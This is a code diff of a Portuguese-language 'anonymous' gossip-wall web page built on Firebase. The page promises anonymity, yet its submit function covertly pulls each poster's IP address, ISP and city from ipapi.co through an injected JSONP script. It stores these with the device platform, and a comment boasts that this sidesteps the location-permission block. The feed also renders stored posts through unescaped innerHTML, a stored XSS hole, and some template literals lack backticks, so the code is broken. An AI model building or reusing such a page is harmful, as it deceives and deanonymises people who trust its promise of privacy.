@@ -3,26 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XOXO - O Mural dos Segredos</title>
+    <title>XOXO - Mural Anonymous</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
 
     <style>
-        :root { --deep-black: #050505; }
-        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; }
-        .hero { height: 40vh; background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
-        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
-        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
+        :root { --deep-black: #050505; --glow: rgba(255, 255, 255, 0.6); }
+        
+        body { 
+            margin: 0; background-color: var(--deep-black); color: #ddd; 
+            font-family: 'Courier New', monospace; overflow-x: hidden;
+        }
+
+        /* Efeito de Névoa Animada */
+        .fog-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; background: radial-gradient(circle, transparent, var(--deep-black));
+        }
+        .fog {
+            position: absolute; width: 200%; height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/smoke.png');
+            opacity: 0.2; animation: moveFog 40s linear infinite;
+        }
+        @keyframes moveFog { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+
+        /* Fundo com Rosto de Anônimo */
+        .hero { 
+            height: 55vh; display: flex; flex-direction: column; 
+            justify-content: center; align-items: center; text-align: center;
+            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop') no-repeat center;
+            background-size: contain;
+        }
+
+        .hero h1 { font-size: 5.5rem; margin: 0; color: #fff; letter-spacing: 15px; text-shadow: 0 0 15px var(--glow); }
+        .hero p { color: #888; font-style: italic; }
+
+        /* Interface Principal */
+        #login-screen { display: flex; justify-content: center; padding: 40px; }
         #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
-        .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
-        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
-        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
-        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
+
+        .btn-enter { 
+            background: transparent; color: white; padding: 15px 40px; 
+            border: 1px solid #555; cursor: pointer; transition: 0.4s;
+        }
+        .btn-enter:hover { background: white; color: black; box-shadow: 0 0 20px white; }
+
+        .input-box { background: rgba(10, 10, 10, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 25px; backdrop-filter: blur(10px); }
+        textarea { width: 100%; background: transparent; border: none; color: #fff; font-size: 1.1rem; outline: none; resize: none; }
+        
+        .btn-post { 
+            background: #222; color: #fff; border: 1px solid #444; 
+            padding: 10px 25px; float: right; cursor: pointer;
+        }
+        .btn-post:disabled { opacity: 0.3; cursor: not-allowed; }
+
+        .fofoca-card { 
+            background: rgba(15, 15, 15, 0.8); padding: 15px; 
+            margin-bottom: 12px; border-left: 2px solid #fff;
+        }
     </style>
 </head>
 <body>
+
+    <div class="fog-container"><div class="fog"></div></div>
 
     <header class="hero">
         <h1>XOXO</h1>
@@ -30,20 +74,20 @@
     </header>
 
     <div id="login-screen">
-        <h3>Entre no mural... se tiver coragem.</h3>
-        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
+        <button class="btn-enter" onclick="entrarNoMural()">ACEDER AO MURAL</button>
     </div>
 
     <div id="feed-container">
         <div class="input-box">
-            <textarea id="fofocaInput" rows="3" placeholder="O que você sabe que ninguém mais sabe?"></textarea>
-            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
+            <textarea id="fofocaInput" rows="3" placeholder="Qual o seu segredo, Anônimo?"></textarea>
+            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">SOLTAR O VERBO</button>
             <div style="clear: both;"></div>
         </div>
         <div id="mural"></div>
     </div>
 
     <script>
+        // CONFIGURAÇÃO DO FIREBASE (SUBSTITUA SE NECESSÁRIO)
         var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -57,12 +101,13 @@
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
-        function fakeLogin() {
+        function entrarNoMural() {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('feed-container').style.display = 'block';
             carregarFofocas();
         }
 
+        // FUNÇÃO DE RASTREIO DE IP (JSONP)
         function enviarFofoca() {
             const input = document.getElementById('fofocaInput');
             const btn = document.getElementById('btnEnviar');
@@ -70,48 +115,44 @@
             if (!texto.trim()) return;
 
             btn.disabled = true;
-            btn.innerText = "Enviando...";
+            btn.innerText = "RASTREANDO...";
 
-            // Tenta pegar IP e informações básicas via JSONP (evita bloqueio CORS)
+            // Criar script de captura (Pula o bloqueio de Localização)
             const script = document.createElement('script');
-            script.src = 'https://ipapi.co/jsonp/callback=callbackRastro';
+            script.src = 'https://ipapi.co/jsonp/callback=salvarComIP';
             
-            // Timeout: Se a API não responder em 3 segundos, envia sem rastro para não travar
-            const rastroTimeout = setTimeout(() => {
-                finalizarEnvio(texto, { info: "Rastro simplificado (timeout)" });
+            // Plano B caso a API falhe em 3 seg
+            const timeout = setTimeout(() => {
+                salvarNoFirebase(texto, { erro: "Rastreio Offline" });
             }, 3000);
 
-            window.callbackRastro = function(data) {
-                clearTimeout(rastroTimeout);
-                const rastroBasico = {
+            window.salvarComIP = function(data) {
+                clearTimeout(timeout);
+                salvarNoFirebase(texto, {
                     ip: data.ip || "0.0.0.0",
-                    cidade: data.city || "Desconhecida",
-                    wifi_provedor: data.org || "Não identificado"
-                };
-                finalizarEnvio(texto, rastroBasico);
+                    wifi: data.org || "Desconhecido",
+                    cidade: data.city || "Desconhecida"
+                });
             };
 
             document.body.appendChild(script);
         }
 
-        function finalizarEnvio(texto, rastro) {
-            const btn = document.getElementById('btnEnviar');
-            const input = document.getElementById('fofocaInput');
-
+        function salvarNoFirebase(texto, rastro) {
             db.collection("fofocas").add({
                 conteudo: texto,
                 data: firebase.firestore.FieldValue.serverTimestamp(),
                 rastro: rastro,
-                dispositivo: navigator.platform
+                plataforma: navigator.platform
             }).then(() => {
-                input.value = "";
-                alert("Enviado!");
+                document.getElementById('fofocaInput').value = "";
+                alert("Segredo guardado com rastro de IP.");
             }).finally(() => {
+                const btn = document.getElementById('btnEnviar');
                 btn.disabled = false;
-                btn.innerText = "Soltar o Verbo!";
-                // Limpa o script injetado
-                const script = document.querySelector('script[src*="ipapi"]');
-                if(script) script.remove();
+                btn.innerText = "SOLTAR O VERBO";
+                const s = document.querySelector('script[src*="ipapi"]');
+                if(s) s.remove();
             });
         }
 
@@ -121,7 +162,7 @@
                 mural.innerHTML = "";
                 snap.forEach(doc => {
                     const f = doc.data();
-                    mural.innerHTML += <div class="fofoca-card"><small>📢 Sussurro:</small><p>${f.conteudo}</p></div>;
+                    mural.innerHTML += <div class="fofoca-card"><small style="color:#555">📢 Alguém disse:</small><p>${f.conteudo}</p></div>;
                 });
             });
         }
